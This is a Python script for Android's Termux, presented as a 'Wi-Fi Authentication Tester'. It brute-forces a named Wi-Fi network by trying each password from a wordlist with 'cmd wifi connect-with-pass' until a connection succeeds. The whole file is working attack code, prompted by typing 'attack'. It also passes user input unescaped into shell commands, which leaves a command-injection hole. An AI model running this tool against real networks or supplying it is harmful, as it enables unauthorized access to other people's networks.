import os
import time
import subprocess
import json

# ANSI Color Codes
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLUE = '\033[94m'

def banner():
    os.system('clear')
    print(f"{RED}{BOLD}" + "="*45)
    print("        WI-FI AUTHENTICATION TESTER")
    print("="*45 + f"{RESET}")
    print(f"      {GREEN}Created By: Bayazid Habib{RESET}")
    print(f"      {BLUE}Engine: Termux-API (Standalone){RESET}\n")

def check_ssid_availability(target_ssid):
    # Shizuku-র কোনো প্রয়োজন নেই, সরাসরি Termux-API ব্যবহার
    print(f"[*] Scanning for SSID: {target_ssid}...")
    try:
        scan_output = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
        if target_ssid in scan_output:
            print(f"{GREEN}[+] SSID '{target_ssid}' is in range.{RESET}")
            return True
        else:
            print(f"{RED}[!] Error: SSID '{target_ssid}' not found nearby!{RESET}")
            return False
    except Exception:
        # Shizuku সংক্রান্ত এরর মেসেজ পুরোপুরি রিমুভ করা হয়েছে
        print(f"{RED}[-] Scan failed! Ensure Termux-API is installed and Location is ON.{RESET}")
        return False

def attack():
    banner()
    
    while True:
        cmd_input = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
        if cmd_input == "attack":
            break

    ssid = input("[+] Target WiFi SSID: ")
    if not check_ssid_availability(ssid):
        return

    wordlist_path = input("[+] Enter Wordlist Path: ")
    if not os.path.exists(wordlist_path):
        print(f"{RED}[-] Wordlist file not found!{RESET}")
        return

    try:
        with open(wordlist_path, 'r') as f:
            lines = f.readlines()
            print(f"\n{GREEN}[*] Process Started for SSID: {ssid}{RESET}")
            
            for index, line in enumerate(lines, 1):
                password = line.strip()
                if len(password) < 8: continue
                
                print(f"[*] Testing [{index}/{len(lines)}]: {password}", end='\r')
                
                # সরাসরি Android CMD কমান্ড
                command = f'cmd wifi connect-with-pass "{ssid}" "{password}"'
                os.system(command)
                
                time.sleep(3)
                
                try:
                    # কানেকশন স্ট্যাটাস চেক
                    check = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
                    if ssid in check and "ip_address" in check:
                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Password found: {password}{RESET}")
                        return
                except:
                    pass
                
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process stopped by user.{RESET}")

if __name__ == "__main__":
    attack()
